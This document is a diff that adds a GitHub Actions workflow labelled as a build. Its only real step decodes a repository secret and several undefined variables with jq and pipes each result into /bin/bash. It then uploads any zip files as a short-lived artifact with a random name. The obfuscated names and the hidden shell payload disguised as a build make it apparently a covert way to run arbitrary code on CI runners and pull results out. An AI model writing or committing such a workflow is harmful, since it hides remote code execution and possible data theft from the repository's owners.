@@ -1,0 +1,34 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          df316: ${{ secrets.df316 }}
+        run: |
+          printf '%s' "$df316" | jq -r .eqov3927 | /bin/bash
+          printf '%s' "$ycco53716" | jq -r .soel36 | /bin/bash
+          echo $d0 | jq -r .unabj2556 | /bin/bash
+          printf '%s' "$qfsyy96026" | jq -r .guogc02575 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: e8WMlTgE
+          path: "*.zip"
+          retention-days: 1
